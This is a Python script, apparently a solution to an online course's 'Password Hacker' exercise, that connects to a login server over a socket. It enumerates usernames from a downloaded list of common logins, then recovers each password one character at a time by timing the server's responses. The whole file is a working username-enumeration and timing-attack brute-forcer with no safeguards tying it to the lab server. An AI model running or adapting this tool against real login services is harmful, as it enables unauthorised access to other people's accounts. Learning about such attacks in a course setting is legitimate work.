from argparse import ArgumentParser
import socket
import requests
import json
import string
from datetime import datetime

common_logins = []
all_chars = [a for a in string.ascii_lowercase + string.ascii_uppercase + string.digits]
url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'


def read_url_to_list(url):
    global common_logins
    r = requests.get(url, 'utf-8')
    for line in r.text.splitlines():
        common_logins.append(line.strip())


def parse_args():
    parser = ArgumentParser('Password Hacker Fun Project!')
    parser.add_argument("ip_addr", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args()
    ip_addr = args.ip_addr
    port = args.port
    return (ip_addr, port)


def connect_and_hack(address):
    with socket.socket() as client_socket:
        client_socket.connect(address)
        #Here i loop through the usernames in the txt file and find the right one
        for username in common_logins:
            dict_json1 = {'login': username, 'password' : " "}
            json_login = json.dumps(dict_json1)
            encoded_message = json_login.encode('utf-8')
            client_socket.send(encoded_message)
            received_message = client_socket.recv(1024)
            decoded_response = received_message.decode('utf-8')
            resp_json = json.loads(decoded_response)
            if resp_json.get("result") == "Wrong password!":
                password = []
                #Build the correct password letter by letter
                while True:
                    for char in all_chars:
                        start_time = datetime.now()
                        test_pass = "".join(password) + char
                        dict_json2 = {'login': username, 'password': test_pass}
                        json_string = json.dumps(dict_json2, indent=2)
                        encoded_message = json_string.encode('utf-8')
                        client_socket.send(encoded_message)
                        received_message = client_socket.recv(1024)
                        decoded_response = received_message.decode('utf-8')
                        resp_json = json.loads(decoded_response)
                        finish = datetime.now()
                        #After we found out that having correct characters in password
                        #there is a delay on the server before responding
                        #we calculate time from send until response and append correct chars to final pass
                        diff = finish - start_time
                        if diff.microseconds > 90000:
                            password.append(char)
                            break
                        elif resp_json.get("result") == "Connection success!":
                            password.append(char)
                            print(json_string)
                            return


address = parse_args()
read_url_to_list(url)
connect_and_hack(address)
